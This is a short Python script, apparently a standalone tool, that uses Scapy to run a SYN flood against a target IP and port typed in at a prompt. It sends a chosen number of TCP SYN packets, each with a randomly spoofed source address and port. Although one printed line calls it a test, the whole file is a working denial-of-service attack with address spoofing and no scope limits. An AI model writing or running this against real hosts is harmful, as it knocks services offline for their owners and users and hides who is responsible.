from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port, packet_count=100):
    print(f"Starting SYN flood test on {target_ip}:{target_port}")
    
    for i in range(packet_count):
        # Generate random source IP and port
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        
        # Create IP and TCP headers
        ip_header = IP(src=src_ip, dst=target_ip)
        tcp_header = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        
        # Combine headers into a packet
        packet = ip_header / tcp_header
        
        # Send the packet
        send(packet, verbose=0)
        
        print(f"Packet {i+1}/{packet_count} sent from {src_ip}:{src_port} to {target_ip}:{target_port}")

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    packet_count = int(input("Enter number of packets to send: "))
    
    syn_flood(target_ip, target_port, packet_count)